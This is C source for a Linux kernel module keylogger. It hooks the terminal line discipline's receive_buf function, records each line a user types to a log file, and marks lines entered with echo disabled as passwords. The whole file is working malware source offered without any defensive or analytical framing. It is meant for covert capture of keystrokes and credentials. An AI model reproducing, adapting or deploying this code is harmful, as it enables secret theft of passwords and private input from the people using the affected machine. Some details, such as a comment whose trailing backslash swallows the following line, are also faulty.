#include <linux/init.h> // required for module_init/exit
#include <linux/module.h> // required for module development
#include <linux/kernel.h> // since we're dealing with the kerne
#include <linux/errno.h> // not too sure about this
#include <linux/unistd.h> // we're messing with syscalls
#include <linux/syscalls.h> // same as above
#include <linux/slab.h>
#include <linux/tty.h>
#include <linux/fs.h>
#include "headers/kfile.h" // file operations

// a module license is required for most modules to run
MODULE_LICENSE("GPL");

// defines for some constants
#define MAX_BUFFER 256
#define MAX_SPECIAL_CHAR_SIZE 12
// backspace chars
#define BACKSPACE_1 127 //local
#define BACKSPACE_2 8 // remote
// escape char
#define ESC_CHAR 27

// our log file
struct file* logfile;

// a struct to hold our chars
struct logger {
  int pos;
  char buf[MAX_BUFFER + MAX_SPECIAL_CHAR_SIZE];
};

// our logger
struct logger* logger;

// functions for our logging, aka appending and resetting
void append_c(char* source, size_t count){
  if((logger->pos + count) > (MAX_BUFFER + MAX_SPECIAL_CHAR_SIZE)){
    // prevent overflow
    return;
  }
  // otherwise, add the string to the buffer
  strncat(logger->buf,source,count);
  logger->pos += count;
}
void reset_logger(){
  logger->pos = 0;
  int i;
  for(i = 0;i < MAX_BUFFER + MAX_SPECIAL_CHAR_SIZE;i++){
    logger->buf[i] = 0;
  }
}

// handles all possible single char characters
void handle_single_char(char* cp){
  switch(cp[0]){
  case 0x01:	//^A
    append_c("[^A]", 4);
    break;
  case 0x02:	//^B
    append_c("[^B]", 4);
    break;
  case 0x03:	//^C
    append_c( "[^C]", 4);
    break;
  case 0x04:	//^D
    append_c("[^D]", 4);
    break;
  case 0x05:	//^E
    append_c("[^E]", 4);
    break;
  case 0x06:	//^F
    append_c("[^F]", 4);
    break;
  case 0x07:	//^G
    append_c("[^G]", 4);
    break;
  case 0x09:	//TAB - ^I
    append_c("[TAB]", 5);
    break;
  case 0x0b:	//^K
    append_c("[^K]", 4);
    break;
  case 0x0c:	//^L
    append_c("[^L]", 4);
    break;
  case 0x0e:	//^E
    append_c("[^E]", 4);
    break;
  case 0x0f:	//^O
    append_c("[^O]", 4);
    break;
  case 0x10:	//^P
    append_c("[^P]", 4);
    break;
  case 0x11:	//^Q
    append_c("[^Q]", 4);
    break;
  case 0x12:	//^R
    append_c("[^R]", 4);
    break;
  case 0x13:	//^S
    append_c("[^S]", 4);
    break;
  case 0x14:	//^T
    append_c("[^T]", 4);
    break;
  case 0x15:	//CTRL-U, deletes everything
    reset_logger();
    break;
  case 0x16:	//^V
    append_c("[^V]", 4);
    break;
  case 0x17:	//^W
    append_c("[^W]", 4);
    break;
  case 0x18:	//^X
    append_c("[^X]", 4);
    break;
  case 0x19:	//^Y
    append_c("[^Y]", 4);
    break;
  case 0x1a:	//^Z
    append_c("[^Z]", 4);
    break;
  case 0x1c:	//^					\
    append_c("[^\\]", 4);
    break;
  case 0x1d:	//^]
    append_c("[^]]", 4);
    break;
  case 0x1e:	//^^
    append_c("[^^]", 4);
    break;
  case 0x1f:	//^_
    append_c("[^_]", 4);
    break;
  case ESC_CHAR:	//ESC
    append_c("[ESC]", 5);
    break;
  default:
    append_c((char*)cp,1);
  }
}

// handles special characters
void handle_special_char(char* cp, size_t count){
}
// pointer to the old receive_buf function
void (*old_receive_buf)(struct tty_struct*,const unsigned char*,
			char*,int);

// our replacement receive_buf
void new_receive_buf(struct tty_struct* tty, const unsigned char* cp,
		     char* fp, int count){

  // ignore raw mode
  if(!tty->raw && !tty->real_raw){
    //if(L_ICANON(tty) && !L_ECHO(tty)) to check for passwd prompts
    // if we have a single character
    if(count == 1){
      // check if it's the backspace char
      if(cp[0] == BACKSPACE_1 ||
	 cp[0] == BACKSPACE_2){
	// make sure we will remain in the buffer
	if(logger->pos){
	  logger->pos--;
	  logger->buf[logger->pos] = 0;
	}
      }else{
	// otherwise, add the char
	handle_single_char((char*)cp);

	// check if the user pressed enter
	if(cp[0] == 0x0D ||
	   cp[0] == 0x0A){
	  // write our current log to our buffer
	  kwrite(logfile,0,logger->buf,logger->pos);

	  // if this is a password
	  if(L_ICANON(tty) && !L_ECHO(tty)){
	    kwrite(logfile,0,"--(the above is a password)--\n",30);
	  }
	  // reset the logger
	  reset_logger();
	}
      }
    }
  }
  // call the old function
  old_receive_buf(tty,cp,fp,count);
}
static int init(void) {
  // our structs
  struct tty_struct* tty = NULL;
  struct file* file = NULL;
  logfile = NULL;
  char* dev_name = "/dev/tty";

  // open the tty
  file = kopen(dev_name,LF_FLAGS,LF_PERMS);
  // open our logfile
  logfile = kopen(LF_PATH,LF_FLAGS,LF_PERMS);

  // init out log file
  char* init_message = "-----beginning of log entry-----\n";
  if(logfile) kwrite(logfile,0,init_message,33);

  if(file){
    // we got a tty, so lets init our logger
    logger = NULL;
    logger = (struct logger*)kmalloc(sizeof(struct logger),GFP_KERNEL);
    reset_logger();

    // grab the tty from the file
    struct tty_file_private* priv = NULL;
    priv = file->private_data;
    if(priv) tty=priv->tty;
    if(tty){
      if(tty->ldisc->ops->receive_buf){
	//change the old receive_buf
	old_receive_buf = tty->ldisc->ops->receive_buf;
	tty->ldisc->ops->receive_buf = new_receive_buf;
      }
    }
  }
  kclose(file);
  return 0;
}
	 
static void exit(void) {
  // close our log file
  char* exit_message = "-----end of log entry-----\n";
  if(logfile) kwrite(logfile,0,exit_message,27);
  if(logfile) kclose(logfile);

  // our structs
  struct tty_struct* tty = NULL;
  struct file* file = NULL;
  char* dev_name = "/dev/tty";

  // open the tty
  file = kopen(dev_name,LF_FLAGS,LF_PERMS);
  if(file){
    // free our logger
    kfree(logger);
    struct tty_file_private* priv = NULL;
    priv = file->private_data;
    if(priv) tty=priv->tty;
    if(tty){
      if(tty->ldisc->ops->receive_buf){
	//restore the receive_buf function
	tty->ldisc->ops->receive_buf = old_receive_buf;
      }
    }
  }
  kclose(file);
}

// sets our custom functions as the init and exit functions
module_init(init);
module_exit(exit);
